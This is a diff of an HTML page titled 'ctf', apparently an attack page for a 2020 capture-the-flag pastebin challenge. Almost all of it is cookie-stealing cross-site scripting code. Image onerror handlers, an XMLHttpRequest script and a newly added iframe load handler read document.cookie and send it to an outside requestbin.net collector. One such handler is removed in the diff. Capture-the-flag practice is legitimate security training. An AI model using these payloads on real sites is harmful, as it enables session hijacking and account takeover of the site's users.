@@ -8,7 +8,6 @@
 <h1>ctf</h1>
 <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
 <img src =asdf onerror="$.get('http://requestbin.net/r/1iksjrn1'+ '?cookie='+ btoa(document.cookie))">
-<img src="#" onerror="document.location='http://requestbin.net/r/1iksjrn1?c=' + document.cookie">
 <script type="text/javascript">
 var theUrl = 'http://requestbin.net/r/1iksjrn1'+ '?cookie='+ btoa(document.cookie);
 var xhr = new XMLHttpRequest()
@@ -21,6 +20,17 @@ var xhr = new XMLHttpRequest()
         }
         xhr.setRequestHeader('Content-Type', 'application/json')
 </script>
+
+
+<iframe id='frame1' src="https://static-pastebin.2020.redpwnc.tf/">
+
+</iframe>
+
+    <script>
+        $('#frame1').load(function() { 
+        document.location='http://requestbin.net/r/1iksjrn1?c=' + document.getElementById("frame1").contentDocument.cookie;
+        })
+    </script>
 </body>
 </html>
 
